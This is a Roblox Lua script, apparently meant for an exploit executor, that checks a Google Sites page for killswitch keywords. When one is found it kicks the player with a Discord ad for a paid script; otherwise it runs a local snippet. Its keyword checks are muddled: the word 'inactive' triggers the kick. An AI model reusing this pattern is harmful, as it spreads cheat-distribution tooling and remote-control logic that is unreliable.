------------------------------------------------------------------------------------------------------------------------------




local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- The URL of the Google Sites page where "killswitch" might be located
local googleSitesURL = "https://sites.google.com/view/freednstest/home"

-- Script to load when Kill-Switch is not active
local scriptToLoad = [[
    print("Free Week")
]]

-- Function to check if the killswitch is active
local function checkKillSwitch()
    local success, response = pcall(function()
        return game:HttpGet(googleSitesURL)
    end)

    if success then
        -- Trim and convert the response to lowercase for more reliable keyword detection
        response = string.lower(response):gsub("%s+", "") -- Remove all whitespaces
       

        -- Method 1: Check for exact string matches in the HTML
        if string.find(response, "killswitch") or string.find(response, "inactive") then
           
           player:Kick("Paid Script: https://discord.gg/qMxbABX7PN")
            return
        end

        -- Method 2: Check for a specific pattern (e.g., 'status: active' or 'status: inactive')
        if string.find(response, "status:inactive") then
          
            player:Kick("Paid Script: https://discord.gg/qMxbABX7PN")
            return
        end

        -- Method 3: Regex match for more complex patterns (optional)
        if string.match(response, "killswitch%=%s*true") then
           
            player:Kick("Paid Script: https://discord.gg/qMxbABX7PN")
            return
        end

        -- If no killswitch is found, load the desired script
        print("Free Week")
        loadstring(scriptToLoad)()
    else
        warn("fail :(")
    end
end

-- Check for the killswitch at the start of the game
checkKillSwitch()
